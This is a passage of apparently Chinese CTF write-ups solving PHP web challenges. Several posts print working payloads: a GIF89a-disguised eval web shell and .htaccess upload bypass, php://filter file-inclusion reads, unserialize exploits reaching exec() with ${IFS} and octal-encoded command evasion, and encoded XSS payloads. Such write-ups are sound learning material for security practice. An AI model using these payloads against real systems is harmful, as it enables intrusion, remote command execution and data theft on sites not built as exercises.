auto_prepend_file=a.jpg\n上传a.jpg，内容为\nGIF89a&lt;?=eval($_POST[&#x27;cmd&#x27;]);?&gt;\n这里也涨知识了，在文件内容头部添加GIF89a居然也可以？\n\n接着上传图片马\n\nF12查看文件去向，原因是你上传的图片马会被该网站同目录下的正常php文件所包含，因此你要知道你在上传图片之后，被哪个php文件包含\n\n接着我们蚁剑连接即可\n\n成功找到flag\n\n当然我们也可以访问该网址进行手动探索\n\n\n成功找到flag，在这里也遇到个神奇的问题，我在上传一段时间后，该木马文件失效了，这里也不知道是何原因\n\n参考文章：\n复现wp\n基础知识文章参考\n","categories":["攻防世界"]},{"title":"攻防世界-fileinclude","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileinclude/","content":"题目描述：\n无\n题目解题：\n简单的文件包含题目，但是我刚看到该页面的时候一脸懵，代码呢？？？，看了看wp发现最基本的查看源代码步骤忘了…\n\n我们开始审计代码，这道题就是让我们设置一个language变量的cookie并将其值传给lan，如果该lan变量存在，我们就可以包含一个可控的php文件，很明显这里我们令lan为读取响应文件源码的代码即可，payload如下：\nlanguage=php://filter/convert.base64-encode/resource=flag   //字符串拼接即可构造处flag.php\n\nbase64解码即可\n\n拿到flag\n参考文章：\n复现参考：\nPHP伪协议知识参考：\n","categories":["攻防世界"]},{"title":"攻防世界-weak_auth","url":"/2023/07/27/weak_auth/","content":"题目描述：\n小宁写了一个登陆验证页面，随手就设了一个密码。\n题目解题：\n打开页面发现如下图是一个简单的登录页面\n\n我们随便输一组账号密码看看\n\n发现其在弹出一个密码错误的边框后，页面跳到check.php页面，查看源代码发现\n\n这大概率就是要bp爆破了，我们不急，现在登录页面尝试几手\n\n我们此次修改了账户名，发现如上弹框，这说明我们必须以admin身份登录，因此只需要抓包爆破password即可\n\n\n如图设置好后开始爆破\n\n如图发现明显点，点击看看响应\n\n找到flag\n","categories":["攻防世界"]},{"title":"攻防世界-fileclude","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-fileclude/","content":"题目描述：\n好多file呀！\n题目解题：\n依旧是一个文件上传，我们进行代码审计\nWRONG WAY! &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&quot;file1&quot;]) &amp;&amp; isset($_GET[&quot;file2&quot;]))&#123;    $file1 = $_GET[&quot;file1&quot;];    $file2 = $_GET[&quot;file2&quot;];    if(!empty($file1) &amp;&amp; !empty($file2))    &#123;        if(file_get_contents($file2) === &quot;hello ctf&quot;)        &#123;            include($file1);        &#125;    &#125;    else        die(&quot;NONONO&quot;);&#125; \n流程为如果get传参file1与file2并且其中的file2参数等于hello ctf，则包含include，否则退出程序\n很明显变量file2可以采用php://input协议绕过，且内容为指定内容，变量file1我们采取PHP伪协议读取源码即可，这里已经有提示要我们读取flag.php文件\npayload如下：\n?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=php://input\n这里file2的内容要用bp抓包添加hello ctf，直接用hackbar无法成功，因为在post栏中的内容要为键值对的形式方可执行\n如图成功得到flag，base64解码即可\n\n\n参考文章：\nwp可参考\n","categories":["攻防世界"]},{"title":"攻防世界-easyphp","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easyphp/","content":"题目描述：\neasyphp\n题目解题：\n一道《简单的》PHP特性题\n代码有点高深，对于菜鸡的我，有点审不过来，就能申的就申\n &lt;?phphighlight_file(__FILE__);//高亮文件$key1 = 0;$key2 = 0;$a = $_GET[&#x27;a&#x27;];   //同下，get传参$b = $_GET[&#x27;b&#x27;];if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)&#123;//如果a不为空，且a取证大于指定数字，长度小于3进入下一步    if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))&#123; //如果b存在，且b的md5编码的指定部分等于指定字符串，进入下一部        $key1 = 1;  //将该变量赋值为1        &#125;else&#123;            die(&quot;Emmm...再想想&quot;);        &#125;    &#125;else&#123;    die(&quot;Emmm...&quot;);&#125;$c=(array)json_decode(@$_GET[&#x27;c&#x27;]);   //接受一个 JSON 编码的字符串C并且把它转换为 PHP 值写到数组array中if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)&#123;//如果C是数组，且$c[&quot;m&quot;]不是数字或数字字符串且$c[&quot;m&quot;]大于2022    if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))&#123;//如果c[&quot;n&quot;]是数组 且c[&quot;n&quot;]的元素值为2 且$c[&quot;n&quot;][0])是数组        $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);//d在数组c[&quot;n&quot;]中搜索&quot;DGGJ&quot;，如果匹配成功返回键值        $d === false?die(&quot;no...&quot;):NULL;//d 为 false的话，挂掉，输出no...        foreach($c[&quot;n&quot;] as $key=&gt;$val)&#123;//检查数组c[&quot;n&quot;]            $val===&quot;DGGJ&quot;?die(&quot;no......&quot;):NULL;//如果c[&quot;n&quot;]是&quot;DGGJ&quot;，挂掉，输出no......        &#125;        $key2 = 1;//赋值key2=1；    &#125;else&#123;        die(&quot;no hack&quot;);    &#125;&#125;else&#123;    die(&quot;no&quot;);&#125;if($key1 &amp;&amp; $key2)&#123;//若这两个变量存在，则回显flag    include &quot;Hgfks.php&quot;;    echo &quot;You&#x27;re right&quot;.&quot;\\n&quot;;    echo $flag;&#125;?&gt; Emmm...\n1 根据第9行 if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)   在变量a中写入整数值大于6000000且长度小于3的字符串。2 根据第10行 if(isset($b) &amp;&amp; &#x27;8b184b&#x27; === substr(md5($b),-6,6))   在变量b中写入末尾md5为&#x27;8b184b&#x27;的字符串，我在印象里有MD5碰撞专用的网站；3 根据第20行 if(is_array($c) &amp;&amp; !is_numeric(@$c[&quot;m&quot;]) &amp;&amp; $c[&quot;m&quot;] &gt; 2022)   在数组c的成员m中写入不是数字或数组字符串且值大于2022的4 根据第21行 if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))   在数组c的成员n中写入元素值为2且c[&quot;n&quot;][0])是数组的5 根据第22行 $d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]);    如果&quot;DGGJ&quot;与$c[&quot;n&quot;]）的搜素结果匹配，且c[&quot;n&quot;]不可以是&quot;DGGJ&quot;本身6 根据第19行 $c=(array)json_decode(@$_GET[&#x27;c&#x27;]);   数组c除了上述要求外，还需要是JSON 编码。\n第一个：查看官方文档发现1e10数字很大，但要求我们长度小于4，那我们试试1e9\n\n很明显可以的，成功绕过\n第二个：应该是md5碰撞，不过这里写脚本更合适，但太菜了，就看看大佬如何写的吧\n&lt;?phpfor($b=1;$b&lt;=100000;$b++)&#123; //b从1到100000   if(preg_match(&#x27;/^8b184b/&#x27;,substr(md5($b),-6,6)))&#123; //匹配md5b的末尾为8b184b      echo $b; //输出b      echo &quot;\\n&quot;;      echo md5($b); //输出md5      echo &quot;\\n&quot;;   &#125;&#125;?&gt;\n代码也很简单（但我依旧想不到-.-）采用一个简单的正则表达式，如果匹配则输出b，我们运行一下看看\n\n第三个：if(is_array($c) &amp;&amp; !is_numeric(@$c[“m”]) &amp;&amp; $c[“m”] &gt; 2022)\n首先我们知道c是一个数组，且有两个元素即c=array(‘m’,‘n’);\n先套用JSON编码运行一遍，就是把c[“m”]='9001 '写成c={“m”:“9001a”}；这里注意双引号，因为根据官方教程，写单引号JSON是不正确的\n\n第四个与第五个：if(is_array(@$c[&quot;n&quot;]) &amp;&amp; count($c[&quot;n&quot;]) == 2 &amp;&amp; is_array($c[&quot;n&quot;][0]))\n$d = array_search(&quot;DGGJ&quot;, $c[&quot;n&quot;]); \narray_search绕过可以参考博文：CTF中常见的 PHP 弱类型漏洞总结 - 北极边界安全团队 - 博客园 (cnblogs.com)\n示例代码如下：\n&lt;?phpif(!is_array($_GET[&#x27;test&#x27;]))&#123;exit();&#125;$test=$_GET[&#x27;test&#x27;];for($i=0;$i&lt;count($test);$i++)&#123;    if($test[$i]===&quot;admin&quot;)&#123;        echo &quot;error&quot;;        exit();    &#125;    $test[$i]=intval($test[$i]);&#125;if(array_search(&quot;admin&quot;,$test)===0)&#123;    echo &quot;flag&quot;;&#125;else&#123;    echo &quot;false&quot;;&#125;?&gt;\n这段代码的意思就是先判断是不是数组，然后在把数组中的内容一个个进行遍历，所有内容都不能等于admin,类型也必须相同，然后转化成int型，然后再进行比较如果填入值与admin相同，则返回flag,如何绕过呢？\n基本思路还是不变，因为用的是三个等于号，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所以payload：test[]=0。\n​\t因此这道题我们可以\n我们直接为c[n0]赋予空值数组，保证可以通过is_array($c[“n”][0])的判定，c[n1]赋予空值，即c=[[],0];0的话，由于这里是强比较那么0肯定不等于false，便成功绕过\n最终c赋值为c=&#123;&quot;m&quot;:&quot;9001 &quot;,&quot;n&quot;:[[0],0]&#125;\npayload为：\n?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;9001 &quot;,&quot;n&quot;:[[0],0]&#125;\n\n得到flag\n参考文章：\nwp参考\n","categories":["攻防世界"]},{"title":"攻防世界-file_include","url":"/2023/08/02/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/","content":"题目描述：\n怎么读取文件呢？\n题目解题：\n简单的PHP代码\n &lt;?phphighlight_file(__FILE__);    include(&quot;./check.php&quot;);    if(isset($_GET[&#x27;filename&#x27;]))&#123;        $filename  = $_GET[&#x27;filename&#x27;];        include($filename);    &#125;?&gt;\n以为题目很简单，我直接尝试php://filter协议读取源代码，却发现做了waf，于是蒙了，所以参考了大佬的wp\n思路就是根据题目逐步猜测其过滤的内容，输入如下两个payload发现：\nhttp://61.147.171.105:64434/?filename=php://fil1ter/con1vert.ba1se64-e1ncode/resource=index.phphttp://61.147.171.105:64434/?filename=php://filter/convert.base64-e1ncode/resource=index.php第一个payload，提示不见了，第二个payload依然有提示，说明base64-encode关键词被过滤；直接在网上搜文件包含绕过base64-encode,最终找到了convert.iconv.* 绕过.\nconvert.iconv.* 绕过\n这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。\niconv — 字符串按要求的字符编码来转换\nconvery.iconv.*的使用有两种方法:\nconvert.iconv..\nconvert.iconv./\n\n和就是编码方式，有如下几种(以下不全)：\n1 UCS-4*2 UCS-4BE3 UCS-4LE*4 UCS-25 UCS-2BE6 UCS-2LE7 UTF-32*8 UTF-32BE*9 UTF-32LE*10 UTF-16*11 UTF-16BE*12 UTF-16LE*13 UTF-714 UTF7-IMAP15 UTF-8*16 ASCII*17 EUC-JP*18 SJIS*19 eucJP-win*20 SJIS-win*21 ISO-2022-JP22 ISO-2022-JP-MS23 CP93224 CP5193225 BASE64\n具体可参考官方手册https://www.php.net/manual/en/mbstring.supported-encodings.php\n本题中我们逐个进行尝试，最终尝试http://61.147.171.105:64434/?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=index.php可以进行绕过。\n通过读取index.php，发现没有提示文字。\n读取check.php，发现过滤文件\n\n直接读取flag.php看看，成功得到\n\n参考文章：\n基础PHP伪协议知识参考\nwp参考\n","categories":["攻防世界"]},{"title":"攻防世界-unseping","url":"/2023/08/06/unseping/","content":"题目描述：\nunseping\n题目解题：\n一道知识点挺多的《简单题》-.-\n代码复杂程度不算高，直接开审\n &lt;?phphighlight_file(__FILE__);class ease&#123;        private $method;    private $args;    function __construct($method, $args) &#123;        $this-&gt;method = $method;        $this-&gt;args = $args;    &#125;     function __destruct()&#123;        if (in_array($this-&gt;method, array(&quot;ping&quot;))) &#123;            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);        &#125;    &#125;      function ping($ip)&#123;        exec($ip, $result);        var_dump($result);    &#125;    function waf($str)&#123;        if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/&quot;, $str, $pat_array)) &#123;            return $str;        &#125; else &#123;            echo &quot;don&#x27;t hack&quot;;        &#125;    &#125;     function __wakeup()&#123;        foreach($this-&gt;args as $k =&gt; $v) &#123;            $this-&gt;args[$k] = $this-&gt;waf($v);        &#125;    &#125;   &#125;$ctf=@$_POST[&#x27;ctf&#x27;];@unserialize(base64_decode($ctf));?&gt;\n找到敏感函数exec，查看一下用法\n\n也就是说该函数执行第一个参数的命令后，将内容填充到第二个参数，这样与var_dump配合，将成功输出命令执行后的内容。\n接着又看到call_user_func_array函数，看一下用法\n\n意思是该函数会把第一个参数当做一个函数调用，并传入第二个参数作为该调用函数的参数，且第二个参数还得是数组，那很明显我们需要让method=ping来调用ping函数，args就作为函数参数来传入，不出所料就要赋值为ls，cat等等，紧接着看到__wakeup方法，对args数组的内容通过foreach循环做了waf处理，那我们看一下waf函数\npreg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/&quot;)\n也就是过滤了|, &amp;, ;, 空格 ``, /以及cat, flag, tac, php, ls字符\n绕过也挺简单，空格利用&lt;, &lt;&gt;, &gt;, ${IFS}等，敏感字符配合单双引号，\\符等，那这里我们先让args=array(“l\\s”)，来查看一下有什么文件\n直接上poc(这里注意题目中的参数属性为私有，为了防止敏感字符我们将其改为public即可)\n&lt;?phpclass ease&#123;        public $method;    public $args;    function __construct($method, $args) &#123;        $this-&gt;method = $method;        $this-&gt;args = $args;    &#125;     function __destruct()&#123;    &#125;      function ping($ip)&#123;    &#125;    function waf($str)&#123;    &#125;     function __wakeup()&#123;    &#125;   &#125;//(!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/&quot;, $str, $pat_array))$a = new ease(&quot;ping&quot;, array(&#x27;l\\s&#x27;));$a = serialize($a);echo $a;echo&#x27;&lt;/br&gt;&#x27;;echo base64_encode($a);?&gt;\n\n这里发现flag所在地，当时试了半天一直cat出不来，以为是哪里出问题，看了wp才知道，这里是一个文件夹。。。。。\n那我们继续用ls，读取看看\n将上述改为array(‘l\\s${IFS}f&quot;&quot;lag_1s_here’)\n\n发现flag所在地，这里也有一个疑问，当时我array()里面用的双引号包裹，然后flag之前用单引号隔开，缺一直行不通，不清楚啥原因，或许是格式吗？\n随后令其等于array(‘ca&quot;&quot;t flag_1s_here/flag_831b69012c67b35f.php’)，但很明显/被过滤了，这里也不知道如何处理，参考wp发现可以用oct命令\noct 绕过命令执行\n$(printf &quot;\\154\\163&quot;)//ls命令，这个编码后可以拼接\n\n需注意，符号都为英文状态下\n此时我们需要执行命令为cat flag_1s_here/flag_831b69012c67b35f.php\n$(printf “cat flag_1s_here/flag_831b69012c67b35f.php”)\n编写脚本对命令进行ascii编码然后八进制转换\n这里也是借用脚本，不太会写。。。\nstr1 = &quot;cat flag_1s_here/flag_831b69012c67b35f.php&quot;arr = []for i in str1://对字符先转换为ASCII码，再转换为八进制    lett = oct(ord(i))    //这个主要是为了将八进制前面的0o替换掉    lett=str(lett).replace(&quot;0o&quot;,&quot;&quot;)    arr.append(lett)sym = &quot;\\\\&quot;# print(arr)//将所有的八进制组合，最终的结果第一个地方应该再添加一个\\ccc=sym.join(arr)print(ccc)\n\n获取到编码后直接用poc获得payload,空格运用${IFS}绕过即可\n&lt;?phpclass ease&#123;public $method;public $args;function __construct($method, $args) &#123;    $this-&gt;method = $method;    $this-&gt;args = $args;&#125;  &#125;$a = new ease(&quot;ping&quot;,array(&#x27;$(printf$&#123;IFS&#125;&quot;\\143\\141\\164\\40\\146\\154\\141\\147\\137\\61\\163\\137\\150\\145\\162\\145\\57\\146\\154\\141\\147\\137\\70\\63\\61\\142\\66\\71\\60\\61\\62\\143\\66\\67\\142\\63\\65\\146\\56\\160\\150\\160&quot;)&#x27;));$b = serialize($a);echo $b;echo&#x27;&lt;/br&gt;&#x27;;echo base64_encode($b);?&gt;\n\n参考文章：\n参考wp\nRCE绕过姿势参考\n","categories":["攻防世界"]},{"title":"内部竞赛2","url":"/2023/08/06/%E5%86%85%E9%83%A8%E7%AB%9E%E8%B5%9B%E9%A2%982/","content":"0x01 easy-serialize\n\n首先进入页面看到如下提示，源代码也没啥信息，就猜测是扫网站的意思，惯性思维直接访问robots.txt，找到php文件\n\n访问开始审代码\n &lt;?phpclass Demo &#123;    private $file = &#x27;index.php&#x27;;    public function __construct($file) &#123;        $this-&gt;file = $file;    &#125;    function __destruct() &#123;        @highlight_file($this-&gt;file);    &#125;    function __wakeup() &#123;        if ($this-&gt;file != &#x27;index.php&#x27;) &#123;            // the ikun is in the fl00000g.php            $this-&gt;file = &#x27;index.php&#x27;;        &#125;    &#125;&#125;if (isset($_GET[&#x27;ikun&#x27;])) &#123;    $kunkun = base64_decode($_GET[&#x27;ikun&#x27;]);    if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $kunkun)) &#123;        die (&#x27;stop Small spot!!!&#x27;);    &#125;    else &#123;        @unserialize($kunkun);    &#125;&#125;else &#123;    highlight_file(&quot;This_isnot_ikun.php&quot;);&#125;?&gt;\n思路很清晰：首先是对ikun参数的过滤，符合条件则开始反序列化，这里看到敏感函数highlight_file，作用是可以高亮指定文件，前提是第二个参数为true，那很明显我们要令file=fl00000g.php，但有一点要注意：开始反序列化的时候会自动调用wakeup魔术方法，而该方法会扰乱我们对file的赋值，因此我们需要绕过该方法\n首先在正则匹配那里，我们可以化为O:+数字来绕过，其次在wakeup中，我们只需要修改该类的属性个数不等于真实个数即可绕过，最后记得base64编码。\n链子如下：\n&lt;?php class Demo &#123;     private $file = &#x27;index.php&#x27;;      public function __construct($file) &#123;         //$this-&gt;file = $file;       &#125;    function __destruct() &#123;          //echo @highlight_file($this-&gt;file, true);      &#125;    function __wakeup() &#123;       &#125;&#125;$a= new Demo(&#x27;fl00000g.php&#x27;);$poc=serialize($a);   $poc=str_replace(&#x27;O:4&#x27;, &#x27;O:+4&#x27;,$poc);  $poc=str_replace(&#x27;:1:&#x27;, &#x27;:2:&#x27;,$poc);   echo $poc;$poc = (base64_encode($poc));  echo $poc;?&gt;\n值得注意的是，这里PHP版本为5.4，因此要注意该类变量中的private属性，而private属性被序列化的时候属性值会变成**%00类名%00属性名**\n因此我们base64编码的时候用自带的函数，不然会导致丢失这些不可见字符\n\nbase64解码即可\n\n0x02 111\n依旧是反序列化，开始审，虽然有点长，但思路清晰\n &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;    $str = (string)$_GET[&#x27;str&#x27;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125; \n我们看到敏感函数file_get_contents，该函数会读取文件，因此很明显我们令filename=flag.php即可，那么我们又看到一个敏感函数file_put_contents，该函数会将指定内容写入指定文件，不出所料我们应该绕过此函数（write），因为函数对我们读取php文件没有丝毫帮助。\n因此我们需要将op赋值为2进入read函数，最后由output输出内容\n但在__destruct()方法中对op进行了强比较，而对比着看到process函数中对op有一个弱比较，因此我们令op等于数字2即可绕过，这样在前者由于类型不同返回true，后者则返回true\n而在is_valid函数中，对我们的反序列化内容的ascii码进行了判断，其实这是在针对protected属性，因为这在序列化会出现不可见字符，那我们可以在编写poc时，将其改为public即可绕过。\npoc如下\n&lt;?phpclass FileHandler &#123;    public $op;    public $filename;    public $content;    function __construct() &#123;        $this-&gt;process();    &#125;    public function process() &#123;           &#125;    private function write() &#123;        &#125;    private function read() &#123;    &#125;    private function output($s) &#123;    &#125;    function __destruct() &#123;    &#125;&#125;function is_valid($s) &#123;&#125;    $poc=new FileHandler();    $poc-&gt;op = 2;    $poc-&gt;filename = &quot;flag.php&quot;;    echo serialize($poc);?&gt;\n得到flag\n\n0x03 a_bad_day\n\n进入页面发现如上，随便点两下看看\n\n看到url出现get传参，猜测是文件包含，那我们直接尝试伪协议读取源代码\n\n发现报错，这时没啥思路了，因为没怎么深究这种题过，因此上网搜寻发现，将php后缀去掉似乎可以\n\n成功取得源码\n&lt;?php\t\t\t\t$file = $_GET[&#x27;category&#x27;];\t\t\t\tif(isset($file))\t\t\t\t&#123;\t\t\t\t\tif( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;\t\t\t\t\t\tinclude ($file . &#x27;.php&#x27;);\t\t\t\t\t&#125;\t\t\t\t\telse&#123;\t\t\t\t\t\techo &quot;Sorry, we currently only support woofers and meowers.&quot;;\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t\t?&gt;\n看到如上php代码，发现一定要包含woofers，meowers，index中的某一个\n这里又长知识了，可以利用伪协议的嵌套\n伪协议的嵌套实际上就是过滤器的嵌套\n\n所以可以构造php://filter/read=convert.base64-encode/meowers/resource=flag\n\n解码即可\n\n0x04 web1\n\n先查看源代码\n\n发现只要成功弹窗即可回显flag，那我们直接输入alert(1)测试一下\n\n发现过滤了script,以及&lt;&gt;符号，继续测试发现对on，src，双引号等都有所过滤，脑袋疼，但同时也发现在value处的过滤似乎少，我们可以尝试一下，尝试一番过后依旧不太行。\n思索一番过后发现利用 JavaScript 伪协议绕过是最简洁的，但没想到也对JavaScript进行了过滤，思考了一阵儿，这时候看了笔记想到可以编码，那我们unicode编码看看\npayload如下：&quot;javascript:alert(1)\n编码后：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;\n输入之后成功弹窗\n\n得到flag\n\n0x05 web2\n\n进去之后是有趣的小游戏，查看源代码也没啥有用信息，那我们直接F12看js源码\nif(b.x==bucket_one.x||b.x==bucket_two.x||b.x==bucket_three.x||b.x==bucket_four.x||b.x==bucket_five.x)&#123;flag=true;&#125;if(flag==true)&#123;score++;&#125;flag=false;defen(score);if(b.y&gt;600||b.y&lt;0)&#123;game_over=true;&#125;if(game_over==false)&#123;requestAnimationFrame(run);&#125;else&#123;if(score&gt;100)&#123;var result=window.confirm(&quot;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b&quot;);&#125;else&#123;var result=window.confirm(&quot;GAMEOVER\\n是否重新开始？&quot;);\n审到这里发现重要信息，发现分数大于100会有弹窗，看内容很明显是unicode编码，我们解码看看\n\n发现要访问110.php\n访问发现一个很简单的PHP特性\n&lt;?phpinclude &#x27;flag.php&#x27;;highlight_file(__FILE__);$flag=&#x27;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;    $id=$_GET[&#x27;id&#x27;];    $gg=$_GET[&#x27;gg&#x27;];    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;        echo &#x27;You got the first step&#x27;;        if(isset($_POST[&#x27;passwd&#x27;])) &#123;            $passwd=$_POST[&#x27;passwd&#x27;];            if (!is_numeric($passwd))            &#123;                 if($passwd==123456)                 &#123;                     echo &#x27;Good Job!&#x27;;                     highlight_file(&#x27;flag.php&#x27;);                     die(&#x27;By Retr_0&#x27;);                 &#125;                 else                 &#123;                     echo &quot;can you think twice??&quot;;                 &#125;            &#125;            else&#123;                echo &#x27;You can not get it !&#x27;;            &#125;        &#125;        else&#123;            die(&#x27;only one way to get the flag&#x27;);        &#125;&#125;    else &#123;        echo &quot;You are not a real hacker!&quot;;    &#125;&#125;else&#123;    die(&#x27;Please input first&#x27;);&#125;?&gt;Please input first\n这里不详细解释了，很简单，首先是简单的md5强碰撞绕过，令gg[]=1&amp;id[]=2，即可绕过，随后是一个is_numeric函数与弱比较的配合，我们令passwd=123456a即可绕过\n成功得到flag\n\n0x06 yuxss\n\n查看源代码，发现四个隐藏元素\n\n那我们可以进行测试看看哪个元素可以显示js代码，这里由于跟xss-lab很像，翻了翻看到这里有个get参数keyword，我们输入以下payload：\n?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;&amp;t_ref=&quot; type=&quot;text&quot;\n\n发现在第三个元素可以回显，我们进行测试后，发现过滤的挺多的无从下手，接着翻文章以及这个t_cook值的特殊我们想到抓包修改cookie\n\n发现user内容与cook内容是同步的，并且过滤也不多，那我们利用input标签闭合看看\npayload：&quot; onclick=alert('xss') type=&quot;text\n\n输入之后点击文本框即可成功弹窗\n\n得到flag\n0x07 babyupload\n文件上传，直接bp抓包上去测试\n\n\n\n简单测试发现，过滤了php后缀，文件type类型以及文件内容检测（检测是否有php标志）\n由于和上次考核题目一致，这里可以用可以使用 eval($_POST[‘bcx’]); 绕过\n因为PHP版本为5.6.23。其次这里需要利用.htaccess文件来让将别的后缀名文件内容解析为php程序\nAddType application/x-httpd-php .bcx\n步骤如下：\n\n然后上传shell\n\n访问shell\n\n成功上传，这里我先用蚁剑连接\n\n根目录成功找到flag\n当然这里令bcx=var_dump(scandir(‘/’));\n\n然后bcx=var_dump(file_get_content(‘/flag’));\n\n0x08 0ctf\n访问之后如下图\n\n查看源代码没啥信息，那用dirsearch扫一下目录，结果发现www.zip，访问得到源码，开始审计\n其中的html代码就不放了\n1. index.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_SESSION[&#x27;username&#x27;]) &#123;\t\theader(&#x27;Location: profile.php&#x27;);\t\texit;\t&#125;\tif($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123;\t\t$username = $_POST[&#x27;username&#x27;];\t\t$password = $_POST[&#x27;password&#x27;];\t\tif(strlen($username) &lt; 3 or strlen($username) &gt; 16) \t\t\tdie(&#x27;Invalid user name&#x27;);\t\tif(strlen($password) &lt; 3 or strlen($password) &gt; 16) \t\t\tdie(&#x27;Invalid password&#x27;);\t\tif($user-&gt;login($username, $password)) &#123;\t\t\t$_SESSION[&#x27;username&#x27;] = $username;\t\t\theader(&#x27;Location: profile.php&#x27;);\t\t\texit;\t\t\t&#125;\t\telse &#123;\t\t\tdie(&#x27;Invalid user name or password&#x27;);\t\t&#125;\t&#125;\telse &#123;?&gt;\n一个简单的登录页面，如果用户名密码正确，则跳转到profile.php页面\n2. register.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123;\t\t$username = $_POST[&#x27;username&#x27;];\t\t$password = $_POST[&#x27;password&#x27;];\t\tif(strlen($username) &lt; 3 or strlen($username) &gt; 16) \t\t\tdie(&#x27;Invalid user name&#x27;);\t\tif(strlen($password) &lt; 3 or strlen($password) &gt; 16) \t\t\tdie(&#x27;Invalid password&#x27;);\t\tif(!$user-&gt;is_exists($username)) &#123;\t\t\t$user-&gt;register($username, $password);\t\t\techo &#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;;\t\t\t\t&#125;\t\telse &#123;\t\t\tdie(&#x27;User name Already Exists&#x27;);\t\t&#125;\t&#125;\telse &#123;?&gt;\n注册页面，也很简单，检查一下输入的用户名和密码，符合要求就连接数据库创建账户\n3. update.php\n&lt;?php\trequire_once(&#x27;class.php&#x27;);\tif($_SESSION[&#x27;username&#x27;] == null) &#123;\t\tdie(&#x27;Login First&#x27;);\t\t&#125;\tif($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;\t\t$username = 